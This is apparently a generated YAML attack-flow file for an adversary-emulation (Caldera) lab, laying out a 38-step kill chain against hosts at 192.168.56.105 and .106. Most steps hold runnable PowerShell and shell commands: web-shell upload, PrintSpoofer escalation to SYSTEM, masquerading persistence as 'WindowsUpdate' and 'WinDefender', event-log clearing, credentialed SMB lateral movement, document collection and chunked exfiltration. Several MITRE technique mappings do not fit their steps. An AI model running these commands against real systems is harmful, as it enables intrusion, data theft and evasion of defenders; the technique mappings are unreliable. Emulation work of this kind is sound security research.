@@ -1,0 +1,947 @@
+metadata:
+  sources:
+    abstract_flow: data/processed/step1_abstract_flow.yml
+    environment: C:\Users\user\Documents\cyber_attack_analysis\test\templates\environment_description.md
+  step: 2
+  description: Concrete attack flow (Kill Chain) with environment-specific details
+  caldera_payloads: []
+concrete_flow:
+  nodes:
+  - id: node_001
+    name: Web Application Login
+    tactic: initial-access
+    description: Authenticate to web application using compromised credentials
+    environment_specific:
+      target: 192.168.56.105
+      url: http://192.168.56.105/login_process.asp
+      method: POST
+      params:
+      - userid
+      - password
+      credentials:
+        username: admin
+        password: P@ssw0rd!2020
+      commands: $body = @{userid='admin'; password='P@ssw0rd!2020'}; $session = New-Object
+        Microsoft.PowerShell.Commands.WebRequestSession; Invoke-WebRequest -Uri 'http://192.168.56.105/login_process.asp'
+        -Method POST -Body $body -WebSession $session -UseBasicParsing
+    technique_candidates:
+    - id: T1133
+      name: External Remote Services
+      score: 5
+    - id: T1566.002
+      name: Spearphishing Link
+      score: 5
+    - id: T1190
+      name: Exploit Public-Facing Application
+      score: 5
+  - id: node_002
+    name: Upload Web Shell
+    tactic: initial-access
+    description: Upload cmd.asp web shell through file upload vulnerability
+    environment_specific:
+      target: 192.168.56.105
+      url: http://192.168.56.105/upload_handler.asp
+      method: POST
+      content_type: multipart/form-data
+      form_field: file
+      payload: cmd.asp
+      upload_path: /uploads/
+      credentials:
+        username: admin
+        password: P@ssw0rd!2020
+      commands: '$loginBody = @{userid=''admin''; password=''P@ssw0rd!2020''}; $session
+        = New-Object Microsoft.PowerShell.Commands.WebRequestSession; Invoke-WebRequest
+        -Uri ''http://192.168.56.105/login_process.asp'' -Method POST -Body $loginBody
+        -WebSession $session -UseBasicParsing; $boundary = [System.Guid]::NewGuid().ToString();
+        $filePath = ''cmd.asp''; $fileContent = Get-Content $filePath -Raw; $bodyLines
+        = @("--$boundary", ''Content-Disposition: form-data; name="file"; filename="cmd.asp"'',
+        ''Content-Type: application/octet-stream'', '''', $fileContent, "--$boundary--");
+        $body = $bodyLines -join "`r`n"; Invoke-WebRequest -Uri ''http://192.168.56.105/upload_handler.asp''
+        -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body
+        $body -WebSession $session -UseBasicParsing'
+    technique_candidates:
+    - id: T1133
+      name: External Remote Services
+      score: 2
+    - id: T1566.001
+      name: Spearphishing Attachment
+      score: 2
+    - id: T1091
+      name: Replication Through Removable Media
+      score: 2
+  - id: node_003
+    name: Verify Web Shell Access
+    tactic: initial-access
+    description: Confirm web shell is accessible and functional
+    environment_specific:
+      target: 192.168.56.105
+      url: http://192.168.56.105/uploads/cmd.asp
+      method: GET
+      commands: Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp' -UseBasicParsing
+    technique_candidates:
+    - id: T1133
+      name: External Remote Services
+      score: 4
+    - id: T1192
+      name: Spearphishing Link
+      score: 3
+    - id: T1566.002
+      name: Spearphishing Link
+      score: 3
+  - id: node_004
+    name: Copy PrintSpoofer to Web Directory
+    tactic: privilege-escalation
+    description: Copy PrintSpoofer64.exe to web-accessible directory
+    environment_specific:
+      payload: PrintSpoofer64.exe
+      destination: C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe
+      commands: Copy-Item -Path 'PrintSpoofer64.exe' -Destination 'C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe'
+        -Force
+    technique_candidates:
+    - id: T1611
+      name: Escape to Host
+      score: 5
+    - id: T1100
+      name: Web Shell
+      score: 4
+    - id: T1034
+      name: Path Interception
+      score: 3
+  - id: node_005
+    name: Copy vcruntime140.dll to Web Directory
+    tactic: privilege-escalation
+    description: Copy required DLL dependency to web-accessible directory
+    environment_specific:
+      payload: vcruntime140.dll
+      destination: C:\inetpub\wwwroot\uploads\vcruntime140.dll
+      commands: Copy-Item -Path 'vcruntime140.dll' -Destination 'C:\inetpub\wwwroot\uploads\vcruntime140.dll'
+        -Force
+    technique_candidates:
+    - id: T1611
+      name: Escape to Host
+      score: 5
+    - id: T1038
+      name: DLL Search Order Hijacking
+      score: 4
+    - id: T1100
+      name: Web Shell
+      score: 4
+  - id: node_006
+    name: Copy Deploy Script to Web Directory
+    tactic: privilege-escalation
+    description: Copy deploy.ps1 Caldera agent deployment script to web-accessible
+      directory
+    environment_specific:
+      payload: deploy.ps1
+      destination: C:\inetpub\wwwroot\uploads\deploy.ps1
+      commands: Copy-Item -Path 'deploy.ps1' -Destination 'C:\inetpub\wwwroot\uploads\deploy.ps1'
+        -Force
+    technique_candidates:
+    - id: T1037.003
+      name: Network Logon Script
+      score: 6
+    - id: T1611
+      name: Escape to Host
+      score: 5
+    - id: T1100
+      name: Web Shell
+      score: 5
+  - id: node_007
+    name: Execute PrintSpoofer Privilege Escalation
+    tactic: privilege-escalation
+    description: Use PrintSpoofer to escalate from IIS service account to SYSTEM and
+      deploy Caldera agent
+    environment_specific:
+      target: 192.168.56.105
+      url: http://192.168.56.105/uploads/cmd.asp
+      exploit: PrintSpoofer64.exe
+      required_privilege: SeImpersonatePrivilege
+      commands: Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe
+        -c "powershell.exe -ExecutionPolicy Bypass -File C:\inetpub\wwwroot\uploads\deploy.ps1"'
+        -UseBasicParsing
+    technique_candidates:
+    - id: T1068
+      name: Exploitation for Privilege Escalation
+      score: 11
+    - id: T1055.011
+      name: Extra Window Memory Injection
+      score: 5
+    - id: T1053.005
+      name: Scheduled Task
+      score: 5
+  - id: node_008
+    name: Create Scheduled Task for Persistence
+    tactic: persistence
+    description: Register malware in task scheduler for persistence across reboots
+    environment_specific:
+      task_name: WindowsUpdate
+      trigger: ONSTART
+      commands: schtasks /create /tn 'WindowsUpdate' /tr 'powershell.exe -ExecutionPolicy
+        Bypass -File C:\Windows\Temp\deploy.ps1' /sc onstart /ru SYSTEM /f
+    technique_candidates:
+    - id: T1053.005
+      name: Scheduled Task
+      score: 10
+    - id: T1053
+      name: Scheduled Task/Job
+      score: 7
+    - id: T1543
+      name: Create or Modify System Process
+      score: 5
+  - id: node_009
+    name: Create Service for Persistence
+    tactic: persistence
+    description: Register malware as system service for persistence
+    environment_specific:
+      service_name: WinDefender
+      binary_path: C:\Windows\Temp\agent.exe
+      commands: sc.exe create WinDefender binPath= 'C:\Windows\Temp\agent.exe' start=
+        auto; sc.exe start WinDefender
+    technique_candidates:
+    - id: T1501
+      name: Systemd Service
+      score: 8
+    - id: T1543.002
+      name: Systemd Service
+      score: 8
+    - id: T1543.003
+      name: Windows Service
+      score: 7
+  - id: node_010
+    name: Clear Security Event Logs
+    tactic: defense-evasion
+    description: Delete security event logs to remove traces of attack
+    environment_specific:
+      log_name: Security
+      commands: wevtutil cl Security
+    technique_candidates:
+    - id: T1070.001
+      name: Clear Windows Event Logs
+      score: 14
+    - id: T1070.002
+      name: Clear Linux or Mac System Logs
+      score: 9
+    - id: T1070.007
+      name: Clear Network Connection History and Configurations
+      score: 8
+  - id: node_011
+    name: Clear System Event Logs
+    tactic: defense-evasion
+    description: Delete system event logs to remove traces of attack
+    environment_specific:
+      log_name: System
+      commands: wevtutil cl System
+    technique_candidates:
+    - id: T1070.001
+      name: Clear Windows Event Logs
+      score: 14
+    - id: T1070.002
+      name: Clear Linux or Mac System Logs
+      score: 13
+    - id: T1070.007
+      name: Clear Network Connection History and Configurations
+      score: 8
+  - id: node_012
+    name: Clear Application Event Logs
+    tactic: defense-evasion
+    description: Delete application event logs to remove traces of attack
+    environment_specific:
+      log_name: Application
+      commands: wevtutil cl Application
+    technique_candidates:
+    - id: T1070.001
+      name: Clear Windows Event Logs
+      score: 14
+    - id: T1070.002
+      name: Clear Linux or Mac System Logs
+      score: 9
+    - id: T1070.007
+      name: Clear Network Connection History and Configurations
+      score: 8
+  - id: node_013
+    name: Delete Uploaded Malware Files
+    tactic: defense-evasion
+    description: Remove malware files from uploads directory
+    environment_specific:
+      files:
+      - C:\inetpub\wwwroot\uploads\cmd.asp
+      - C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe
+      - C:\inetpub\wwwroot\uploads\vcruntime140.dll
+      - C:\inetpub\wwwroot\uploads\deploy.ps1
+      commands: Remove-Item -Path 'C:\inetpub\wwwroot\uploads\cmd.asp','C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe','C:\inetpub\wwwroot\uploads\vcruntime140.dll','C:\inetpub\wwwroot\uploads\deploy.ps1'
+        -Force -ErrorAction SilentlyContinue
+    technique_candidates:
+    - id: T1140
+      name: Deobfuscate/Decode Files or Information
+      score: 6
+    - id: T1070.010
+      name: Relocate Malware
+      score: 6
+    - id: T1027
+      name: Obfuscated Files or Information
+      score: 5
+  - id: node_014
+    name: Deploy Keylogger (Simulated)
+    tactic: credential-access
+    description: Simulate keylogger deployment for credential harvesting
+    environment_specific:
+      output_file: C:\Windows\Temp\perfcon.dat
+      simulation: true
+      commands: echo 'keylogger stub - capturing keystrokes' > C:\Windows\Temp\perfcon.dat;
+        Write-Output 'Keylogger installed (simulated)'
+    technique_candidates:
+    - id: T1552.001
+      name: Credentials In Files
+      score: 3
+    - id: T1557
+      name: Adversary-in-the-Middle
+      score: 2
+    - id: T1056.001
+      name: Keylogging
+      score: 2
+  - id: node_015
+    name: Gather System Information
+    tactic: discovery
+    description: Collect OS version, hostname, and system configuration
+    environment_specific:
+      output_file: C:\Windows\Temp\sysinfo.txt
+      commands: systeminfo > C:\Windows\Temp\sysinfo.txt
+    technique_candidates:
+    - id: T1082
+      name: System Information Discovery
+      score: 10
+    - id: T1007
+      name: System Service Discovery
+      score: 6
+    - id: T1016
+      name: System Network Configuration Discovery
+      score: 6
+  - id: node_016
+    name: Identify Current User Context
+    tactic: discovery
+    description: Determine current user privileges and context
+    environment_specific:
+      output_file: C:\Windows\Temp\whoami.txt
+      commands: whoami /all > C:\Windows\Temp\whoami.txt
+    technique_candidates:
+    - id: T1497.002
+      name: User Activity Based Checks
+      score: 5
+    - id: T1069
+      name: Permission Groups Discovery
+      score: 3
+    - id: T1069.003
+      name: Cloud Groups
+      score: 3
+  - id: node_017
+    name: Enumerate Local User Accounts
+    tactic: discovery
+    description: Discover local user accounts on compromised system
+    environment_specific:
+      output_file: C:\Windows\Temp\localusers.txt
+      commands: net user > C:\Windows\Temp\localusers.txt
+    technique_candidates:
+    - id: T1087.001
+      name: Local Account
+      score: 8
+    - id: T1497.002
+      name: User Activity Based Checks
+      score: 6
+    - id: T1069.001
+      name: Local Groups
+      score: 6
+  - id: node_018
+    name: Enumerate Domain Accounts
+    tactic: discovery
+    description: Discover domain user accounts
+    environment_specific:
+      output_file: C:\Windows\Temp\domainusers.txt
+      commands: net user /domain > C:\Windows\Temp\domainusers.txt 2>&1
+    technique_candidates:
+    - id: T1087.002
+      name: Domain Account
+      score: 6
+    - id: T1069.002
+      name: Domain Groups
+      score: 4
+    - id: T1482
+      name: Domain Trust Discovery
+      score: 4
+  - id: node_019
+    name: Enumerate Running Processes
+    tactic: discovery
+    description: Identify active processes including security tools
+    environment_specific:
+      output_file: C:\Windows\Temp\processes.txt
+      commands: tasklist /v > C:\Windows\Temp\processes.txt
+    technique_candidates:
+    - id: T1615
+      name: Group Policy Discovery
+      score: 4
+    - id: T1007
+      name: System Service Discovery
+      score: 3
+    - id: T1526
+      name: Cloud Service Discovery
+      score: 3
+  - id: node_020
+    name: Enumerate System Services
+    tactic: discovery
+    description: Query running services for exploitation targets
+    environment_specific:
+      output_file: C:\Windows\Temp\services.txt
+      commands: sc query > C:\Windows\Temp\services.txt
+    technique_candidates:
+    - id: T1497.001
+      name: System Checks
+      score: 7
+    - id: T1033
+      name: System Owner/User Discovery
+      score: 5
+    - id: T1049
+      name: System Network Connections Discovery
+      score: 5
+  - id: node_021
+    name: Search Critical System Files
+    tactic: discovery
+    description: Locate system files and DLLs to assess patch levels
+    environment_specific:
+      search_paths:
+      - C:\Windows\System32
+      - C:\Windows\SysWOW64
+      output_file: C:\Windows\Temp\systemfiles.txt
+      commands: Get-ChildItem -Path 'C:\Windows\System32','C:\Windows\SysWOW64' -Filter
+        *.dll -Recurse -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime
+        > C:\Windows\Temp\systemfiles.txt
+    technique_candidates:
+    - id: T1033
+      name: System Owner/User Discovery
+      score: 6
+    - id: T1497.001
+      name: System Checks
+      score: 6
+    - id: T1007
+      name: System Service Discovery
+      score: 6
+  - id: node_022
+    name: Enumerate Network Configuration
+    tactic: discovery
+    description: Map network settings and interfaces
+    environment_specific:
+      output_file: C:\Windows\Temp\ipconfig.txt
+      commands: ipconfig /all > C:\Windows\Temp\ipconfig.txt
+    technique_candidates:
+    - id: T1016
+      name: System Network Configuration Discovery
+      score: 9
+    - id: T1049
+      name: System Network Connections Discovery
+      score: 6
+    - id: T1040
+      name: Network Sniffing
+      score: 5
+  - id: node_023
+    name: Enumerate ARP Table
+    tactic: discovery
+    description: Discover network hosts via ARP cache
+    environment_specific:
+      output_file: C:\Windows\Temp\arp.txt
+      commands: arp -a > C:\Windows\Temp\arp.txt
+    technique_candidates:
+    - id: T1201
+      name: Password Policy Discovery
+      score: 3
+    - id: T1018
+      name: Remote System Discovery
+      score: 3
+    - id: T1046
+      name: Network Service Discovery
+      score: 3
+  - id: node_024
+    name: Enumerate Routing Table
+    tactic: discovery
+    description: Map network routing configuration
+    environment_specific:
+      output_file: C:\Windows\Temp\route.txt
+      commands: route print > C:\Windows\Temp\route.txt
+    technique_candidates:
+    - id: T1040
+      name: Network Sniffing
+      score: 2
+    - id: T1082
+      name: System Information Discovery
+      score: 2
+    - id: T1580
+      name: Cloud Infrastructure Discovery
+      score: 2
+  - id: node_025
+    name: Monitor Active Network Connections
+    tactic: discovery
+    description: Identify established connections and listening ports
+    environment_specific:
+      output_file: C:\Windows\Temp\netstat.txt
+      commands: netstat -ano > C:\Windows\Temp\netstat.txt
+    technique_candidates:
+    - id: T1049
+      name: System Network Connections Discovery
+      score: 8
+    - id: T1040
+      name: Network Sniffing
+      score: 5
+    - id: T1135
+      name: Network Share Discovery
+      score: 5
+  - id: node_026
+    name: Enumerate Active Sessions
+    tactic: discovery
+    description: Identify logged-in users and active sessions
+    environment_specific:
+      output_file: C:\Windows\Temp\sessions.txt
+      commands: qwinsta > C:\Windows\Temp\sessions.txt
+    technique_candidates:
+    - id: T1033
+      name: System Owner/User Discovery
+      score: 3
+    - id: T1615
+      name: Group Policy Discovery
+      score: 3
+    - id: T1087.002
+      name: Domain Account
+      score: 3
+  - id: node_027
+    name: Discover Network Shares
+    tactic: discovery
+    description: Enumerate network shares and remote systems
+    environment_specific:
+      output_file: C:\Windows\Temp\netview.txt
+      commands: net view > C:\Windows\Temp\netview.txt
+    technique_candidates:
+    - id: T1135
+      name: Network Share Discovery
+      score: 7
+    - id: T1016
+      name: System Network Configuration Discovery
+      score: 7
+    - id: T1049
+      name: System Network Connections Discovery
+      score: 7
+  - id: node_028
+    name: Enumerate Domain Controllers
+    tactic: discovery
+    description: Identify domain controllers in network
+    environment_specific:
+      output_file: C:\Windows\Temp\dclist.txt
+      commands: 'nltest /dclist: > C:\Windows\Temp\dclist.txt 2>&1'
+    technique_candidates:
+    - id: T1482
+      name: Domain Trust Discovery
+      score: 6
+    - id: T1087.002
+      name: Domain Account
+      score: 5
+    - id: T1615
+      name: Group Policy Discovery
+      score: 4
+  - id: node_029
+    name: Test SMB Access to Internal Host
+    tactic: lateral-movement
+    description: Verify SMB connectivity to internal network target
+    environment_specific:
+      target: 192.168.56.106
+      share: C$
+      credentials:
+        username: admin
+        password: P@ssw0rd!2020
+      commands: net use \\192.168.56.106\C$ /user:admin P@ssw0rd!2020
+    technique_candidates:
+    - id: T1527
+      name: Application Access Token
+      score: 6
+    - id: T1550.001
+      name: Application Access Token
+      score: 6
+    - id: T1534
+      name: Internal Spearphishing
+      score: 5
+  - id: node_030
+    name: Copy Caldera Agent to Internal Host
+    tactic: lateral-movement
+    description: Deploy Caldera agent to internal system via SMB
+    environment_specific:
+      target: 192.168.56.106
+      share: C$
+      source: C:\Windows\Temp\deploy.ps1
+      destination: \\192.168.56.106\C$\Windows\Temp\deploy.ps1
+      commands: Copy-Item -Path 'C:\Windows\Temp\deploy.ps1' -Destination '\\192.168.56.106\C$\Windows\Temp\deploy.ps1'
+        -Force
+    technique_candidates:
+    - id: T1534
+      name: Internal Spearphishing
+      score: 5
+    - id: T1563.001
+      name: SSH Hijacking
+      score: 4
+    - id: T1210
+      name: Exploitation of Remote Services
+      score: 4
+  - id: node_031
+    name: Execute Remote Agent Deployment
+    tactic: lateral-movement
+    description: Execute Caldera agent on internal host via remote PowerShell
+    environment_specific:
+      target: 192.168.56.106
+      credentials:
+        username: admin
+        password: P@ssw0rd!2020
+      commands: $password = ConvertTo-SecureString 'P@ssw0rd!2020' -AsPlainText -Force;
+        $cred = New-Object System.Management.Automation.PSCredential('admin', $password);
+        Invoke-Command -ComputerName 192.168.56.106 -Credential $cred -ScriptBlock
+        {powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\deploy.ps1}
+    technique_candidates:
+    - id: T1072
+      name: Software Deployment Tools
+      score: 7
+    - id: T1210
+      name: Exploitation of Remote Services
+      score: 7
+    - id: T1021
+      name: Remote Services
+      score: 6
+  - id: node_032
+    name: Collect IIS Web Logs
+    tactic: collection
+    description: Gather web server logs for analysis
+    environment_specific:
+      source_path: C:\inetpub\logs\LogFiles
+      destination: C:\Windows\Temp\exfil\weblogs
+      commands: New-Item -Path 'C:\Windows\Temp\exfil\weblogs' -ItemType Directory
+        -Force; Copy-Item -Path 'C:\inetpub\logs\LogFiles\*' -Destination 'C:\Windows\Temp\exfil\weblogs'
+        -Recurse -Force
+    technique_candidates:
+    - id: T1056.003
+      name: Web Portal Capture
+      score: 5
+    - id: T1557
+      name: Adversary-in-the-Middle
+      score: 2
+    - id: T1123
+      name: Audio Capture
+      score: 2
+  - id: node_033
+    name: Collect Corporate Documents
+    tactic: collection
+    description: Search and collect sensitive corporate documents
+    environment_specific:
+      search_paths:
+      - C:\Users
+      - C:\inetpub\wwwroot
+      file_extensions:
+      - '*.docx'
+      - '*.xlsx'
+      - '*.pdf'
+      destination: C:\Windows\Temp\exfil\docs
+      commands: New-Item -Path 'C:\Windows\Temp\exfil\docs' -ItemType Directory -Force;
+        Get-ChildItem -Path 'C:\Users','C:\inetpub\wwwroot' -Include *.docx,*.xlsx,*.pdf
+        -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination 'C:\Windows\Temp\exfil\docs'
+        -Force
+    technique_candidates:
+    - id: T1602
+      name: Data from Configuration Repository
+      score: 3
+    - id: T1025
+      name: Data from Removable Media
+      score: 3
+    - id: T1114.001
+      name: Local Email Collection
+      score: 3
+  - id: node_034
+    name: Capture Active Window Titles (Simulated)
+    tactic: collection
+    description: Monitor open application windows through simulated keylogger
+    environment_specific:
+      output_file: C:\Windows\Temp\exfil\windows.txt
+      simulation: true
+      commands: New-Item -Path 'C:\Windows\Temp\exfil' -ItemType Directory -Force;
+        Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object MainWindowTitle,ProcessName
+        > C:\Windows\Temp\exfil\windows.txt
+    technique_candidates:
+    - id: T1123
+      name: Audio Capture
+      score: 5
+    - id: T1125
+      name: Video Capture
+      score: 5
+    - id: T1113
+      name: Screen Capture
+      score: 4
+  - id: node_035
+    name: Stage Discovery Results
+    tactic: collection
+    description: Consolidate all discovery command outputs for exfiltration
+    environment_specific:
+      source_files:
+      - C:\Windows\Temp\sysinfo.txt
+      - C:\Windows\Temp\whoami.txt
+      - C:\Windows\Temp\localusers.txt
+      - C:\Windows\Temp\domainusers.txt
+      - C:\Windows\Temp\processes.txt
+      - C:\Windows\Temp\services.txt
+      - C:\Windows\Temp\systemfiles.txt
+      - C:\Windows\Temp\ipconfig.txt
+      - C:\Windows\Temp\arp.txt
+      - C:\Windows\Temp\route.txt
+      - C:\Windows\Temp\netstat.txt
+      - C:\Windows\Temp\sessions.txt
+      - C:\Windows\Temp\netview.txt
+      - C:\Windows\Temp\dclist.txt
+      destination: C:\Windows\Temp\exfil\discovery
+      commands: New-Item -Path 'C:\Windows\Temp\exfil\discovery' -ItemType Directory
+        -Force; Copy-Item -Path 'C:\Windows\Temp\*.txt' -Destination 'C:\Windows\Temp\exfil\discovery'
+        -Force -ErrorAction SilentlyContinue
+    technique_candidates:
+    - id: T1119
+      name: Automated Collection
+      score: 2
+    - id: T1530
+      name: Data from Cloud Storage
+      score: 2
+    - id: T1114.003
+      name: Email Forwarding Rule
+      score: 2
+  - id: node_036
+    name: Compress Collected Data
+    tactic: exfiltration
+    description: Compress staged data using PowerShell built-in compression
+    environment_specific:
+      source_path: C:\Windows\Temp\exfil
+      destination: C:\Windows\Temp\data.zip
+      tool: PowerShell Compress-Archive
+      commands: Compress-Archive -Path 'C:\Windows\Temp\exfil\*' -DestinationPath
+        'C:\Windows\Temp\data.zip' -Force
+    technique_candidates:
+    - id: T1002
+      name: Data Compressed
+      score: 7
+    - id: T1030
+      name: Data Transfer Size Limits
+      score: 4
+    - id: T1537
+      name: Transfer Data to Cloud Account
+      score: 4
+  - id: node_037
+    name: Split Archive into Chunks
+    tactic: exfiltration
+    description: Split compressed data into 90KB chunks to evade detection
+    environment_specific:
+      source_file: C:\Windows\Temp\data.zip
+      chunk_size: 92160
+      output_pattern: C:\Windows\Temp\data_chunk_
+      commands: $file = 'C:\Windows\Temp\data.zip'; $chunkSize = 92160; $buffer =
+        New-Object byte[] $chunkSize; $reader = [System.IO.File]::OpenRead($file);
+        $chunkNum = 0; while (($bytesRead = $reader.Read($buffer, 0, $chunkSize))
+        -gt 0) { $chunkFile = "C:\Windows\Temp\data_chunk_$chunkNum"; [System.IO.File]::WriteAllBytes($chunkFile,
+        $buffer[0..($bytesRead-1)]); $chunkNum++ }; $reader.Close()
+    technique_candidates:
+    - id: T1048.001
+      name: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
+      score: 3
+    - id: T1048.002
+      name: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+      score: 3
+    - id: T1030
+      name: Data Transfer Size Limits
+      score: 3
+  - id: node_038
+    name: Exfiltrate Data to Caldera Server
+    tactic: exfiltration
+    description: Upload collected data chunks to Caldera server
+    environment_specific:
+      target: 192.168.56.1:8888
+      url: http://192.168.56.1:8888/file/upload
+      method: POST
+      source_pattern: C:\Windows\Temp\data_chunk_*
+      commands: Get-ChildItem -Path 'C:\Windows\Temp\data_chunk_*' | ForEach-Object
+        { Invoke-RestMethod -Uri 'http://192.168.56.1:8888/file/upload' -Method POST
+        -InFile $_.FullName }
+    technique_candidates:
+    - id: T1537
+      name: Transfer Data to Cloud Account
+      score: 8
+    - id: T1002
+      name: Data Compressed
+      score: 6
+    - id: T1567.003
+      name: Exfiltration to Text Storage Sites
+      score: 6
+  edges:
+  - from: node_001
+    to: node_002
+    dependency_type: required
+  - from: node_002
+    to: node_003
+    dependency_type: required
+  - from: node_003
+    to: node_004
+    dependency_type: required
+  - from: node_003
+    to: node_005
+    dependency_type: required
+  - from: node_003
+    to: node_006
+    dependency_type: required
+  - from: node_004
+    to: node_007
+    dependency_type: required
+  - from: node_005
+    to: node_007
+    dependency_type: required
+  - from: node_006
+    to: node_007
+    dependency_type: required
+  - from: node_007
+    to: node_008
+    dependency_type: required
+  - from: node_007
+    to: node_009
+    dependency_type: required
+  - from: node_007
+    to: node_014
+    dependency_type: required
+  - from: node_007
+    to: node_015
+    dependency_type: required
+  - from: node_015
+    to: node_016
+    dependency_type: required
+  - from: node_016
+    to: node_017
+    dependency_type: required
+  - from: node_017
+    to: node_018
+    dependency_type: required
+  - from: node_016
+    to: node_019
+    dependency_type: required
+  - from: node_019
+    to: node_020
+    dependency_type: required
+  - from: node_020
+    to: node_021
+    dependency_type: required
+  - from: node_016
+    to: node_022
+    dependency_type: required
+  - from: node_022
+    to: node_023
+    dependency_type: required
+  - from: node_023
+    to: node_024
+    dependency_type: required
+  - from: node_022
+    to: node_025
+    dependency_type: required
+  - from: node_025
+    to: node_026
+    dependency_type: required
+  - from: node_023
+    to: node_027
+    dependency_type: required
+  - from: node_027
+    to: node_028
+    dependency_type: required
+  - from: node_028
+    to: node_029
+    dependency_type: required
+  - from: node_029
+    to: node_030
+    dependency_type: required
+  - from: node_030
+    to: node_031
+    dependency_type: required
+  - from: node_007
+    to: node_032
+    dependency_type: required
+  - from: node_032
+    to: node_033
+    dependency_type: required
+  - from: node_014
+    to: node_034
+    dependency_type: required
+  - from: node_021
+    to: node_035
+    dependency_type: required
+  - from: node_026
+    to: node_035
+    dependency_type: required
+  - from: node_028
+    to: node_035
+    dependency_type: required
+  - from: node_033
+    to: node_035
+    dependency_type: required
+  - from: node_034
+    to: node_035
+    dependency_type: required
+  - from: node_035
+    to: node_036
+    dependency_type: required
+  - from: node_036
+    to: node_037
+    dependency_type: required
+  - from: node_037
+    to: node_038
+    dependency_type: required
+  - from: node_031
+    to: node_010
+    dependency_type: required
+  - from: node_038
+    to: node_010
+    dependency_type: required
+  - from: node_010
+    to: node_011
+    dependency_type: required
+  - from: node_011
+    to: node_012
+    dependency_type: required
+  - from: node_012
+    to: node_013
+    dependency_type: required
+  execution_order:
+  - node_001
+  - node_002
+  - node_003
+  - node_004
+  - node_005
+  - node_006
+  - node_007
+  - node_008
+  - node_009
+  - node_014
+  - node_015
+  - node_016
+  - node_017
+  - node_018
+  - node_019
+  - node_020
+  - node_021
+  - node_022
+  - node_023
+  - node_024
+  - node_025
+  - node_026
+  - node_027
+  - node_028
+  - node_029
+  - node_030
+  - node_031
+  - node_032
+  - node_033
+  - node_034
+  - node_035
+  - node_036
+  - node_037
+  - node_038
+  - node_010
+  - node_011
+  - node_012
+  - node_013
